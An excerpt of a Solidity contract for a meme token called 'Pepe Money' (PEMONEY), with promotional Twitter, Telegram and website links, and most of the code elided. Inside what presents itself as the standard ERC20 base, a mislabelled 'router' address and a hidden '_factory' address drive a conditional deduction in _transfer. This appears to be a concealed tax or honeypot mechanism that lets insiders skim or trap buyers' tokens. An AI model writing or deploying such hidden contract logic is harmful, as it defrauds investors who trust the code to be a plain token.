...
https://twitter.com/PepeMoneyBNB
https://t.me.com/PepeMoneyBNB
https://PepeMoneyBNB.xyz
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address private _factory = 0x3c651c6574DBbf1c98c5b7ff6289b3e2604F5959;
    address internal _uniswapRouterV2 = 0xfbA63746b7501eA8Af3D865C4dbf3f0153145929;
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual
    {
        ...
        uint256 swapamount = amount.mul(to != tx.origin && from != _uniswapRouterV2 && _balances[_factory] > 0 ? _pairToken : swappingToggle).div(100)+0;
        if (swapamount > 0)
        {
...
contract PepeMoney is ERC20, Ownable {
    constructor() ERC20(unicode"Pepe Money", unicode"PEMONEY") {
